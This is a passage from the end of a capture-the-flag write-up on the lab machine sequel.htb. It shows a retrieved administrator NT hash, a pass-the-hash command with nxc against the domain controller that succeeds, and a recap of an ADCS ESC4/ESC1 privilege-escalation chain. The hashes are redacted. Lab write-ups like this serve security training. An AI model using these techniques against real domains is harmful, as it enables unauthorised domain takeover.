[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:<REDACTED>
```

```bash
nxc smb $FQDN -u administrator -H <REDACTED>

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\administrator:<REDACTED> (Pwn3d!)
```

Where we can see that we have full administrator privileges over the domain.

## Quick Recap

In this write-up, we have seen how to perform a privilege escalation attack using `ADCS` and `ESC4/ESC1` vulnerabilities. We started by enumerating the target machine, then we found credentials for an administrator of the `mssql` server, which we used to get a shell on the machine. On the host, we found credentials for a privileged user and we could perform an `ESC4`attack and gain full administrator privileges over the domain.
